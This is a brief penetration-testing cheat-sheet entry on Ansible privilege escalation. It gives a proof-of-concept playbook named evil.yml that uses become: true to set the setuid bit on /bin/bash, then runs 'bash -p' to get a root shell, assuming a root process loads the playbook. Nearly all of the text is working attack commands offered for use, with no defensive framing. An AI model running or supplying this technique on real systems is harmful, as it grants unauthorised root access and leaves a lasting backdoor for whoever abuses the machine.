# Ansible PrivEsc
>If an ansible file is loaded by a root process : **Privilege Escalation**

## PoC
```bash
# Create a .yml file just like the other one
nano evil.yml
# Content :
- hosts: localhost
  tasks:
    - name: RShell
      command: chmod u+s /bin/bash
      become: true

# save
ls -lah /bin/bash
ansible-playbook evil.yml
bash -p
# root
```
